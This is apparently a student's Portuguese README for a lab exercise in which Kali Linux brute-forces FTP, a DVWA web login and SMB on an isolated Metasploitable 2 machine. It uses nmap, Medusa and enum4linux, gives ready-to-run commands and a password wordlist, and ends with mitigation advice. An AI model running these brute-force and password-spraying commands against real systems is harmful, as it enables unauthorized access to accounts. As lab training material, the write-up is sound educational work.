# 🔐 Desafio de Cibersegurança  
## Ataques de Força Bruta com Medusa, Kali Linux e Ambientes Vulneráveis

Este repositório documenta a execução prática do desafio de cibersegurança utilizando **Kali Linux**, **Medusa**, **Metasploitable 2** e **DVWA**, simulando ataques de força bruta em serviços FTP, Web e SMB.

O objetivo é demonstrar entendimento dos conceitos, ferramentas e medidas de mitigação em ambientes controlados.

---

# 🏗️ 1. Arquitetura do Ambiente

As máquinas virtuais utilizadas seguem a arquitetura abaixo:

| Máquina | Sistema | Função | Rede |
|--------|----------|---------|---------|
| **Kali Linux** | Kali Rolling | Atacante | Host-Only |
| **Metasploitable 2** | Linux Vulnerável | Alvo (FTP, SMB, DVWA) | Host-Only |

Configurações adicionais:
- Comunicação interna via Host-Only  
- Testes de conectividade via `ping`  
- DVWA configurado com nível de segurança **Low**

---

# 🔎 2. Varredura de Serviços com Nmap

Os serviços foram identificados com o comando:

```bash
nmap -sV -Pn 192.168.56.101
```

Serviços relevantes detectados:

- **FTP (21)**
- **SSH (22)**
- **Apache Web Server (80)**
- **Samba SMB (445)**

As evidências encontram-se na pasta `/images`.

---

# 🔐 3. Ataque de Força Bruta (FTP) com Medusa

### 📄 Wordlist utilizada
Local: `wordlists/passwords.txt`

Exemplo de entradas:
```
admin
password
123456
msfadmin
kali
toor
```

### ▶️ Comando executado:
```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp
```

### ✅ Resultado esperado:
Credenciais válidas identificadas:
```
msfadmin : msfadmin
```

---

# 🌐 4. Força Bruta em Formulário Web (DVWA)

Configurações iniciais:
- Usuário padrão: `admin`
- Nível de segurança do DVWA: **Low**

### ▶️ Comando utilizado:
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http \
 -m FORM:"/dvwa/login.php" \
 -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
 -m ACCEPT:"Login failed"
```

### ✅ Resultado:
Senha válida encontrada:
```
admin : password
```

---

# 📡 5. Password Spraying em SMB

### 5.1 Enumeração de usuários:
```bash
enum4linux -U 192.168.56.101
```

Usuários obtidos (exemplo):
```
msfadmin
user
service
```

Lista armazenada em:  
`wordlists/users.txt`

### 5.2 Password spraying:
Tentativa da mesma senha para vários usuários:

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -p msfadmin -M smbnt
```

---

# 🛡️ 6. Medidas de Mitigação

Com base nos vetores explorados, as seguintes recomendações podem reduzir riscos:

### 🔐 Senhas e autenticação
- Implementar senhas fortes e políticas de expiração.  
- Utilizar MFA sempre que possível.  

### 🧱 Fortalecimento de serviços
- Desabilitar serviços desnecessários (ex.: FTP).  
- Configurar lockout após tentativas falhas.

### 📈 Monitoramento e Logs
- Implementar ferramentas de detecção como **Fail2ban**.  
- Verificar logs com regularidade (SSH, Apache, Samba).

### 🔄 Atualizações
- Manter sistemas e serviços atualizados.  
- Aplicar patches de segurança assim que lançados.

---

# 📁 7. Estrutura do Repositório

```
/desafio-medusa-bruteforce
├── README.md
├── /images
│   └── .gitkeep
├── /wordlists
│   ├── passwords.txt
│   └── users.txt
└── /scripts
    ├── scan_nmap.sh
    └── ftp_bruteforce.sh
```

---

# 🏁 8. Conclusão

Este projeto demonstra na prática como ataques de força bruta operam em diferentes vetores (FTP, Web e SMB), reforçando a importância de:

- boas práticas de autenticação,  
- hardening de serviços,  
- monitoramento contínuo e  
- redução da superfície de ataque.

O conteúdo foi preparado de forma clara e organizada para fins educacionais e documentação no portfólio técnico.

---

📌 Este repositório atende aos requisitos do desafio da DIO e pode ser enviado como entrega final.
